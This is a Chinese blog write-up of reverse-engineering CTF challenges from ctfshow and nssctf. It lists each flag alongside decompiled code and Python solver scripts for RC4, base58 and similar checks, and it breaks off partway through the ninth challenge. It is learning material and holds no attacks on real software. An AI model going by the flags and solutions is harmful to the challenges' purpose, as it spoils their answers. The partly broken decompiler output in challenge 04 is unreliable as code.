      <link href="/2026/01/31/CTF-Reverse%E6%9A%91%E6%9C%9F%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2026/01/31/CTF-Reverse%E6%9A%91%E6%9C%9F%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>以下题目来源：ctfshow reverse + nssctf reverse</p><p>（ctfshow里面这个板块的题目有点少，不成体系）</p><p>(´･_･`)✍️📄</p><h2 id="01-逆向签到题"><a href="#01-逆向签到题" class="headerlink" title="01 逆向签到题"></a>01 逆向签到题</h2><p>🚩flag：<code>flag{7ujm8ikhy6}</code></p><p>💡hint：<code>基础分析</code></p><p>使用ida pro打开可以直接看到。</p><p>![截屏2025-08-09 21.33.46](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-09 21.33.46.png)</p><hr><h2 id="02-re2"><a href="#02-re2" class="headerlink" title="02 re2"></a>02 re2</h2><p>🚩flag：<code>flag{RC4&amp;-&gt;ENc0d3F1le}</code></p><p>💡hint：<code>基础分析</code> <code>rc4解密</code></p><p>ida分析主函数，将flag.txt内容加密写入enflag.txt。</p><p>![截屏2025-08-10 09.15.00](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 09.15.00.png)</p><p>分析到标准rc4加密。</p><p>enflag.txt是flag.txt进行rc4加密后的结果。在这里进行解密。</p><p>这是密钥加密过程：</p><p>![截屏2025-08-10 09.23.26](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 09.23.26.png)</p><p>解密密钥：<code>[Warnning]Access_Unauthoriz~d</code></p><p>![截屏2025-08-10 09.37.48](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 09.37.48.png)</p><p>对enflag.txt进行rc4解密。</p><p>![截屏2025-08-10 09.42.11](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 09.42.11.png)</p><hr><blockquote><p>03～05为萌新赛</p></blockquote><h2 id="03-flag白给"><a href="#03-flag白给" class="headerlink" title="03 flag白给"></a>03 flag白给</h2><p>🚩flag：<code>flag{HackAv}</code></p><p>💡hint：<code>加壳</code></p><p>检查是否加壳，经过检查有壳。</p><p>![截屏2025-08-10 10.08.49](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 10.08.49.png)</p><p>使用upx脱壳。</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">upx -d flag.exe</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-10 10.11.36](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 10.11.36.png)</p><p>然后使用ida找到flag。</p><hr><h2 id="04-签退"><a href="#04-签退" class="headerlink" title="04 签退"></a>04 签退</h2><p>🚩flag：<code>flag{c_t_f_s_h_0_w_!}</code></p><p>💡hint：<code>python逆向</code></p><p>用pycdc反编译或<a href="https://tool.lu/pyc/">python反编译 - 在线工具</a></p><p>![截屏2025-08-10 10.25.31](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 10.25.31.png)</p><p>得到python源代码：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">c_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="string">'()'</span></span><br><span class="line">flag = <span class="string">'BozjB3vlZ3ThBn9bZ2jhOH93ZaH9'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">origin_bytes</span>):</span><br><span class="line">    c_bytes = [ <span class="string">'{:0&gt;8}'</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(b)).replace(<span class="string">'0b'</span>, <span class="string">''</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> origin_bytes ]</span><br><span class="line">    resp = <span class="string">''</span></span><br><span class="line">    nums = <span class="built_in">len</span>(c_bytes) // <span class="number">3</span></span><br><span class="line">    remain = <span class="built_in">len</span>(c_bytes) % <span class="number">3</span></span><br><span class="line">    integral_part = c_bytes[<span class="number">0</span>:<span class="number">3</span> * nums]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> [</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">6</span>,</span><br><span class="line">        <span class="number">12</span>,</span><br><span class="line">        <span class="number">18</span>]:</span><br><span class="line">        tmp_unit = [][<span class="built_in">int</span>(tmp_unit[x:x + <span class="number">6</span>], <span class="number">2</span>)]</span><br><span class="line">        resp += <span class="string">''</span>.join([ c_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit ])</span><br><span class="line">        integral_part = integral_part[<span class="number">3</span>:]</span><br><span class="line">    <span class="keyword">if</span> remain:</span><br><span class="line">        remain_part = <span class="string">''</span>.join(c_bytes[<span class="number">3</span> * nums:]) + (<span class="number">3</span> - remain) * <span class="string">'0'</span> * <span class="number">8</span></span><br><span class="line">        tmp_unit = [ <span class="built_in">int</span>(remain_part[x:x + <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">6</span>,</span><br><span class="line">            <span class="number">12</span>,</span><br><span class="line">            <span class="number">18</span>] ][:remain + <span class="number">1</span>]</span><br><span class="line">        resp += <span class="string">''</span>.join([ c_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit ]) + (<span class="number">3</span> - remain) * <span class="string">'.'</span></span><br><span class="line">    <span class="keyword">return</span> rend(resp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rend</span>(<span class="params">s</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encodeCh</span>(<span class="params">ch</span>):</span><br><span class="line">        </span><br><span class="line">        f = <span class="keyword">lambda</span> x: <span class="built_in">chr</span>(((<span class="built_in">ord</span>(ch) - x) + <span class="number">2</span>) % <span class="number">26</span> + x)</span><br><span class="line">        <span class="keyword">if</span> ch.islower():</span><br><span class="line">            <span class="keyword">return</span> f(<span class="number">97</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">None</span>,).isupper():</span><br><span class="line">            <span class="keyword">return</span> f(<span class="number">65</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="string">''</span>.join,)((<span class="keyword">lambda</span> <span class="number">.0</span>: <span class="keyword">pass</span>)(s))</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>解密脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Python 2.7 解密脚本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义字符集（与加密时一致）</span></span><br><span class="line">c_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="string">'()'</span></span><br><span class="line">flag = <span class="string">'BozjB3vlZ3ThBn9bZ2jhOH93ZaH9'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">encoded_str</span>):</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    解密函数：将编码后的字符串还原为原始字节</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># 移除可能的填充字符（原代码中的'.'）</span></span><br><span class="line">    clean_str = encoded_str.rstrip(<span class="string">'.'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将每个字符转换回6位二进制值</span></span><br><span class="line">    bit_groups = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> clean_str:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            index = c_charset.index(c)</span><br><span class="line">            bit_groups.append(<span class="string">'{:06b}'</span>.<span class="built_in">format</span>(index))</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 合并所有二进制位</span></span><br><span class="line">    bit_stream = <span class="string">''</span>.join(bit_groups)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 分割为8位一组（原始字节）</span></span><br><span class="line">    bytes_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bit_stream), <span class="number">8</span>):</span><br><span class="line">        byte_bits = bit_stream[i:i+<span class="number">8</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte_bits) == <span class="number">8</span>:</span><br><span class="line">            bytes_list.append(<span class="built_in">int</span>(byte_bits, <span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([<span class="built_in">chr</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bytes_list])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_rend</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    反转rend函数的变换</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> ch.islower():</span><br><span class="line">            <span class="comment"># 反转小写字母变换</span></span><br><span class="line">            original = <span class="built_in">chr</span>(((<span class="built_in">ord</span>(ch) - <span class="number">97</span>) - <span class="number">2</span>) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">        <span class="keyword">elif</span> ch.isupper():</span><br><span class="line">            <span class="comment"># 反转大写字母变换</span></span><br><span class="line">            original = <span class="built_in">chr</span>(((<span class="built_in">ord</span>(ch) - <span class="number">65</span>) - <span class="number">2</span>) % <span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 非字母字符保持不变</span></span><br><span class="line">            original = ch</span><br><span class="line">        result.append(original)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encoded_flag</span>):</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    完整解密流程：</span></span><br><span class="line"><span class="string">    1. 先反转rend函数的字母位移</span></span><br><span class="line"><span class="string">    2. 然后解码Base64-like编码</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># 第一步：反转字母位移</span></span><br><span class="line">    reversed_rend = reverse_rend(encoded_flag)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 第二步：解码二进制数据</span></span><br><span class="line">    decoded_bytes = decode(reversed_rend)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> decoded_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[*] 加密后的flag:"</span>, flag)</span><br><span class="line">    decrypted = decrypt(flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[+] 解密后的flag:"</span>, decrypted)</span><br></pre></td></tr></tbody></table></figure><p>运行结果：</p><p>![截屏2025-08-10 10.29.44](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 10.29.44.png)</p><hr><h2 id="05-数学不及格"><a href="#05-数学不及格" class="headerlink" title="05 数学不及格"></a>05 数学不及格</h2><p>🚩flag：<code>flag{newbee_here}</code></p><p>💡hint：<code>反编译</code></p><p>ida pro反编译：</p><figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">char</span> *endptr; <span class="comment">// [rsp+18h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// [rsp+28h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( argc != <span class="number">5</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"argc nonono"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  }</span><br><span class="line">  v4 = <span class="built_in">strtol</span>(argv[<span class="number">4</span>], &amp;endptr, <span class="number">16</span>) - <span class="number">25923</span>;</span><br><span class="line">  v9 = <span class="built_in">f</span>(v4);</span><br><span class="line">  v10 = <span class="built_in">strtol</span>(argv[<span class="number">1</span>], &amp;v6, <span class="number">16</span>);</span><br><span class="line">  v11 = <span class="built_in">strtol</span>(argv[<span class="number">2</span>], &amp;v7, <span class="number">16</span>);</span><br><span class="line">  v12 = <span class="built_in">strtol</span>(argv[<span class="number">3</span>], &amp;v8, <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 - v10 != <span class="number">0x233F0E151CLL</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"argv1 nonono!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( v9 - v11 != <span class="number">0x1B45F81A32LL</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"argv2 nonono!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( v9 - v12 != <span class="number">0x244C071725LL</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"argv3 nonono!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)v4 + v12 + v11 + v10 != <span class="number">0x13A31412F8CLL</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"argv sum nonono!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"well done!decode your argv!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>判断了四个方程，并且v9=f(v4)</p><p>双击跟进f()函数，返回斐波那契数列第n项</p><p>于是(v9-v10)+(v9-v11)+(v9-v12)+(v4+v12+v11+v10)=3*v9+v4=0x19d024e75ff，十进制为1773860189695，又v9=f(v4)</p><figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">f</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  _QWORD *ptr; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">1</span> || a1 &gt; <span class="number">200</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">8LL</span> * a1);</span><br><span class="line">  *ptr = <span class="number">1LL</span>;</span><br><span class="line">  ptr[<span class="number">1</span>] = <span class="number">1LL</span>;</span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">2</span>; i &lt; a1; ++i )</span><br><span class="line">  {</span><br><span class="line">    ptr[i] = ptr[i - <span class="number">1</span>] + ptr[i - <span class="number">2</span>];</span><br><span class="line">    v3 = ptr[i];</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>写脚本爆破：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> v4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">100</span>):</span><br><span class="line">    a = [<span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,v4):</span><br><span class="line">        v9=a[i-<span class="number">1</span>]+a[i-<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="number">3</span>*v9+v4 == <span class="number">1773860189695</span>:</span><br><span class="line">            <span class="built_in">print</span>(v4)</span><br><span class="line">            <span class="built_in">print</span>(v9)</span><br><span class="line">        a.append(v9)</span><br></pre></td></tr></tbody></table></figure><p>得到：</p><blockquote><p>58<br>591286729879</p></blockquote><p>得到v4，v9后解出argv数组</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">v9=<span class="number">591286729879</span></span><br><span class="line">v4=<span class="number">58</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(v9-<span class="number">0x233F0E151C</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(v9-<span class="number">0x1B45F81A32</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(v9-<span class="number">0x244C071725</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(v4+<span class="number">0x6543</span>))</span><br></pre></td></tr></tbody></table></figure><p>得到：</p><blockquote><p>0x666c61677b<br>0x6e65776265<br>0x655f686572<br>0x657d</p></blockquote><p>解密：</p><p>![截屏2025-08-10 10.43.40](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 10.43.40.png)</p><hr><blockquote><p>06~09为内部赛</p></blockquote><h2 id="06-批量生产的伪劣商品"><a href="#06-批量生产的伪劣商品" class="headerlink" title="06 批量生产的伪劣商品"></a>06 批量生产的伪劣商品</h2><p>🚩flag：<code>ctfshow{群主最爱36D}</code></p><p>💡hint：<code>安卓逆向</code> <code>静态分析</code> <code>反编译</code></p><p>apk文件，jadx打开，查看AndroidManifest.xml</p><p>![截屏2025-08-10 10.58.57](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 10.58.57.png)</p><p>找到app入口appinventor.ai_QA629A242D5E83EFA948B9020CD35CB60.checkme.a</p><p>![截屏2025-08-10 10.59.51](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 10.59.51.png)</p><p>即可看到flag。</p><hr><h2 id="07-来一个派森"><a href="#07-来一个派森" class="headerlink" title="07 来一个派森"></a>07 来一个派森</h2><p>🚩flag：<code>ctfshow{zhe_bu_shi_flag}</code></p><p>💡hint：<code>python逆向</code> <code>静态分析</code> <code>反编译</code></p><p>使用python反编译工具pyinstxtractor.py，将.exe文件转换成.pyc文件</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python pyinstxtractor.py checkme.exe</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-10 11.06.50](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 11.06.50.png)</p><p><a href="https://tool.lu/pyc/">python反编译 - 在线工具</a>得到python源码</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">b58encode</span>(<span class="params">tmp = <span class="literal">None</span></span>):</span><br><span class="line">    tmp = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, tmp))</span><br><span class="line">    temp = tmp[<span class="number">0</span>]</span><br><span class="line">    base58 = <span class="string">'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp) - <span class="number">1</span>):</span><br><span class="line">        temp = temp * <span class="number">256</span> + tmp[i + <span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">None</span>:</span><br><span class="line">        temp = temp // <span class="number">58</span></span><br><span class="line">        <span class="keyword">if</span> temp == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        temp = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">            temp += base58[i]</span><br><span class="line">        </span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(temp)):</span><br><span class="line">        tmp.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(temp[i]) ^ i))</span><br><span class="line">    </span><br><span class="line">    check = [<span class="string">'A'</span>,<span class="string">'5'</span>,<span class="string">'q'</span>,<span class="string">'O'</span>,<span class="string">'g'</span>,<span class="string">'q'</span>,<span class="string">'d'</span>,<span class="string">'\x7f'</span>,<span class="string">'['</span>,<span class="string">'\x7f'</span>,<span class="string">'s'</span>,<span class="string">'{'</span>,<span class="string">'G'</span>,<span class="string">'A'</span>,<span class="string">'x'</span>,<span class="string">'`'</span>,<span class="string">'D'</span>,<span class="string">'@'</span>,<span class="string">'K'</span>,<span class="string">'c'</span>,<span class="string">'-'</span>,<span class="string">'c'</span>,<span class="string">' '</span>,<span class="string">'G'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'|'</span>,<span class="string">'x'</span>,<span class="string">'}'</span>,<span class="string">'J'</span>,<span class="string">'h'</span>,<span class="string">'\\'</span>,<span class="string">'l'</span>]</span><br><span class="line">    <span class="keyword">if</span> tmp == check:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">'输入flag：'</span>)</span><br><span class="line"><span class="keyword">if</span> b58encode(flag):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'you win'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'try again'</span>)</span><br></pre></td></tr></tbody></table></figure><p>解密脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">b58decode</span>():</span><br><span class="line">    <span class="comment"># 已知的check数组</span></span><br><span class="line">    check = [<span class="string">'A'</span>, <span class="string">'5'</span>, <span class="string">'q'</span>, <span class="string">'O'</span>, <span class="string">'g'</span>, <span class="string">'q'</span>, <span class="string">'d'</span>, <span class="string">'\x7f'</span>, <span class="string">'['</span>, <span class="string">'\x7f'</span>, <span class="string">'s'</span>, <span class="string">'{'</span>, <span class="string">'G'</span>, <span class="string">'A'</span>, <span class="string">'x'</span>, <span class="string">'`'</span>, <span class="string">'D'</span>, <span class="string">'@'</span>, <span class="string">'K'</span>, <span class="string">'c'</span>,</span><br><span class="line">             <span class="string">'-'</span>, <span class="string">'c'</span>, <span class="string">' '</span>, <span class="string">'G'</span>, <span class="string">'+'</span>, <span class="string">'+'</span>, <span class="string">'|'</span>, <span class="string">'x'</span>, <span class="string">'}'</span>, <span class="string">'J'</span>, <span class="string">'h'</span>, <span class="string">'\\'</span>, <span class="string">'l'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一步：逆向异或操作</span></span><br><span class="line">    base58_chars = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(check)):</span><br><span class="line">        <span class="comment"># 逆向异或：encrypted_char ^ i = original_char</span></span><br><span class="line">        original_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(check[i]) ^ i)</span><br><span class="line">        base58_chars.append(original_char)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二步：Base58解码（逆向原编码过程）</span></span><br><span class="line">    base58 = <span class="string">'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将Base58字符转换为对应的索引</span></span><br><span class="line">    indices = [base58.index(c) <span class="keyword">for</span> c <span class="keyword">in</span> base58_chars]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第三步：将Base58索引转换为大整数</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> indices:</span><br><span class="line">        num = num * <span class="number">58</span> + i</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第四步：将大整数转换为原始字节</span></span><br><span class="line">    original_bytes = []</span><br><span class="line">    <span class="keyword">while</span> num &gt; <span class="number">0</span>:</span><br><span class="line">        original_bytes.append(num % <span class="number">256</span>)</span><br><span class="line">        num = num // <span class="number">256</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 字节顺序是反的，需要反转</span></span><br><span class="line">    original_bytes = original_bytes[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转换为字符串</span></span><br><span class="line">    flag = <span class="string">''</span>.join([<span class="built_in">chr</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> original_bytes])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试解密</span></span><br><span class="line">decrypted_flag = b58decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"解密后的flag:"</span>, decrypted_flag)</span><br></pre></td></tr></tbody></table></figure><p>结果：</p><p>![截屏2025-08-10 11.15.44](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 11.15.44.png)</p><hr><h2 id="08-好好学习-天天向上"><a href="#08-好好学习-天天向上" class="headerlink" title="08 好好学习 天天向上"></a>08 好好学习 天天向上</h2><p>🚩flag：<code>flag{good_good_study_day_day_up}</code></p><p>💡hint：<code>静态分析</code> <code>反编译</code> <code>爆破</code></p><p>爆破脚本</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">tab = <span class="string">'abdefglostuyp{}_'</span></span><br><span class="line">aa = <span class="built_in">open</span>(<span class="string">'cStuday.exe'</span>, <span class="string">'rb'</span>).read()[<span class="number">0x2400</span>: <span class="number">0x13400</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deeptry</span>(<span class="params">i, v4, s</span>):</span><br><span class="line">    <span class="keyword">if</span> v4&lt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        <span class="comment">#print(i,hex(v4),s)</span></span><br><span class="line">        <span class="keyword">if</span> v4 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'--&gt;'</span>+s)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        v2 = <span class="number">17</span>*(j + <span class="number">16</span>*i)</span><br><span class="line">        p = <span class="number">8</span> * (tab.index(s[<span class="number">0</span>]) + v2)</span><br><span class="line">        <span class="comment">#print(hex(p))</span></span><br><span class="line">        tmp = v4 - u64(aa[p:p+<span class="number">8</span>])</span><br><span class="line">        deeptry(i-<span class="number">1</span>, tmp, tab[j]+s)</span><br><span class="line"> </span><br><span class="line">s = <span class="string">'}'</span></span><br><span class="line">deeptry(<span class="number">31</span>,<span class="number">0x1C836D8E5C11047F</span>,s)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="09-屏幕裂开了"><a href="#09-屏幕裂开了" class="headerlink" title="09 屏幕裂开了"></a>09 屏幕裂开了</h2><p>🚩flag：<code>flag{i_hope_you_didnt_click_the_button_99999__justRE_in_Static}</code></p><p>💡hint：<code>静态分析</code> <code>反编译</code> <code>安卓逆向</code></p><p>jadx打开。</p><p>![截屏2025-08-10 11.23.23](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 11.23.23.png)</p><p>定位关键函数checkflag</p><p>![截屏2025-08-10 